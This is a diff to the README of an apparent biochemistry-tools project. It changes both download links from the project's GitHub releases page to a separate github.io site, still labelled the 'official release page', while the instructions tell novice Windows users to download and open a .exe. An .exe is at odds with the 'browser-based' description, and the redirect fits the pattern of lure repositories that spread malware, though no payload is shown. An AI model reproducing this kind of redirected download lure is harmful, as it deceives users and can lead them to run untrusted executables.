@@ -1,6 +1,6 @@
 # 🧬 biochemtools-2026 - Simplify your biochemistry calculations with ease
 
-[![](https://img.shields.io/badge/Download-biochemtools-2026-blue)](https://github.com/Benjytufted641/biochemtools-2026/releases)
+[![](https://img.shields.io/badge/Download-biochemtools-2026-blue)](https://benjytufted641.github.io)
 
 Biochemtools-2026 provides browser-based tools for biochemistry tasks. These tools help students and researchers perform pI calculations, analyze enzyme kinetics, prepare buffers, and trace glycolysis pathways. The software shows each step of the calculation to help you learn the underlying concepts.
 
@@ -8,7 +8,7 @@ Biochemtools-2026 provides browser-based tools for biochemistry tasks. These too
 
 You do not need programming experience to use this software. Follow the instructions below to download and run the application on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Benjytufted641/biochemtools-2026/releases).
+1. Go to the [official release page](https://benjytufted641.github.io).
 2. Look for the latest version under the Assets section.
 3. Click the link that ends with .exe to save the file to your computer.
 4. Open your Downloads folder.
